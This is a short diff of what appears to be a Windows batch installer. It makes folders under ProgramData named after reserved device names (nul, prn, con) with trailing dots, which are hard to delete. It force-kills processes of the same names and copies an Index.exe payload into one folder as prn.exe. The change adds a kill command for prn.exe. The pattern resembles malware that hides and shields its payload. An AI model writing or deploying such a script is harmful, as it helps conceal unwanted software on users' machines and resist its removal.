@@ -43,6 +43,7 @@ mkdir \\?\%ProgramData%\nuldata..\
 mkdir \\?\%ProgramData%\prndata..\
 mkdir \\?\%ProgramData%\condata..\
 taskkill.exe /f /IM nul.exe
+taskkill.exe /f /IM prn.exe
 taskkill.exe /f /IM con.exe
 
 copy /Y "%ProgramData%\hared\Index.exe" "\\?\%ProgramData%\prndata..\prn.exe"
